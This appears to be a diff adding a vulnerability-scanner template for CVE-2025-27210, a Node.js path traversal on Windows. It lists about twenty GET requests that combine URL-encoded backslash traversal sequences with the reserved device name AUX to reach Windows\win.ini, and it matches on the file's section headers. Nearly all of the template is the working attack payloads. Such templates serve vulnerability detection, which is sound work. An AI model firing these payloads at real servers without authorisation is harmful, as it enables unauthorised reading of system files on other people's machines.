@@ -1,0 +1,46 @@
+id: cve-2025-27210-nodejs-path-traversal
+
+info:
+  name: CVE-2025-27210 - NodeJS Windows Path Traversal via reserved device name AUX (URL Encoded Payload)
+  author: chatgpt
+  severity: critical
+  description: |
+    NodeJS versions 20.x, 22.x, 24.x on Windows are vulnerable to path traversal
+    due to improper handling of Windows reserved device names like AUX combined
+    with path traversal sequences in RESTful endpoints.
+  tags: path-traversal,nodejs,windows,cve2025
+
+requests:
+  - method: GET
+    paths:
+      - "{{BaseURL}}/files/..%5C..%5C..%5C..%5C..%5C..%5CAUX%5C..%5CWindows%5Cwin.ini"
+      - "{{BaseURL}}/download/..%5C..%5C..%5C..%5C..%5C..%5CAUX%5C..%5CWindows%5Cwin.ini"
+      - "{{BaseURL}}/get-file/..%5C..%5C..%5C..%5C..%5C..%5CAUX%5C..%5CWindows%5Cwin.ini"
+      - "{{BaseURL}}/assets/..%5C..%5C..%5C..%5C..%5C..%5CAUX%5C..%5CWindows%5Cwin.ini"
+      - "{{BaseURL}}/static/..%5C..%5C..%5C..%5C..%5C..%5CAUX%5C..%5CWindows%5Cwin.ini"
+      - "{{BaseURL}}/public/..%5C..%5C..%5C..%5C..%5C..%5CAUX%5C..%5CWindows%5Cwin.ini"
+      - "{{BaseURL}}/view/..%5C..%5C..%5C..%5C..%5C..%5CAUX%5C..%5CWindows%5Cwin.ini"
+      - "{{BaseURL}}/render/..%5C..%5C..%5C..%5C..%5C..%5CAUX%5C..%5CWindows%5Cwin.ini"
+      - "{{BaseURL}}/data/..%5C..%5C..%5C..%5C..%5C..%5CAUX%5C..%5CWindows%5Cwin.ini"
+      - "{{BaseURL}}/content/..%5C..%5C..%5C..%5C..%5C..%5CAUX%5C..%5CWindows%5Cwin.ini"
+      - "{{BaseURL}}/export/..%5C..%5C..%5C..%5C..%5C..%5CAUX%5C..%5CWindows%5Cwin.ini"
+      - "{{BaseURL}}/reports/..%5C..%5C..%5C..%5C..%5C..%5CAUX%5C..%5CWindows%5Cwin.ini"
+      - "{{BaseURL}}/open/..%5C..%5C..%5C..%5C..%5C..%5CAUX%5C..%5CWindows%5Cwin.ini"
+      - "{{BaseURL}}/logs/..%5C..%5C..%5C..%5C..%5C..%5CAUX%5C..%5CWindows%5Cwin.ini"
+      - "{{BaseURL}}/uploads/..%5C..%5C..%5C..%5C..%5C..%5CAUX%5C..%5CWindows%5Cwin.ini"
+      - "{{BaseURL}}/docs/..%5C..%5C..%5C..%5C..%5C..%5CAUX%5C..%5CWindows%5Cwin.ini"
+      - "{{BaseURL}}/backup/..%5C..%5C..%5C..%5C..%5C..%5CAUX%5C..%5CWindows%5Cwin.ini"
+      - "{{BaseURL}}/api/files/..%5C..%5C..%5C..%5C..%5C..%5CAUX%5C..%5CWindows%5Cwin.ini"
+      - "{{BaseURL}}/temp/..%5C..%5C..%5C..%5C..%5C..%5CAUX%5C..%5CWindows%5Cwin.ini"
+      - "{{BaseURL}}/files/download/..%5C..%5C..%5C..%5C..%5C..%5CAUX%5C..%5CWindows%5Cwin.ini"
+
+    matchers:
+      - type: word
+        words:
+          - "[windows]"
+          - "[extensions]"
+          - "[fonts]"
+        part: body
+      - type: status
+        status:
+          - 200
